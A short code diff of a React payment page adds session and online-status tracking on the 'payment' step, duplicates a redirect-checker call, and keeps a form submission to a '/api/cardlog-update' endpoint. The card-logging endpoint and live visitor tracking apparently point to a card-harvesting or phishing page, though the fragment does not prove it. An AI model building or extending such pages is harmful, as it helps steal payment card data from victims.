@@ -7,10 +7,18 @@ import Help from "../../components/Help/Help";
 import { useRedirectChecker } from "../../hooks/useRedirectChecker";
 import Loading from "../../components/Loading/Loading";
 import Modal from "../../components/UI/Modal/Modal";
+import { useOnlineStatus } from "../../hooks/useOnlineStatus";
 
 const Payment = () => {
+  const sessionId = localStorage.getItem("currentSessionId");
   const location = useLocation();
   useRedirectChecker(3000);
+  useRedirectChecker(3000);
+  useOnlineStatus({
+    sessionId,
+    pageName: "payment",
+    enabled: true,
+  });
   const [isLoading, setLoading] = useState<boolean>(false);
   const [currentStep, setCurrentStep] = useState<"personal" | "payment">(
     "personal"
@@ -86,8 +94,6 @@ const Payment = () => {
     }
 
     try {
-      
-
       const response = await fetch("/api/cardlog-update", {
         // Новый эндпоинт
         method: "POST",
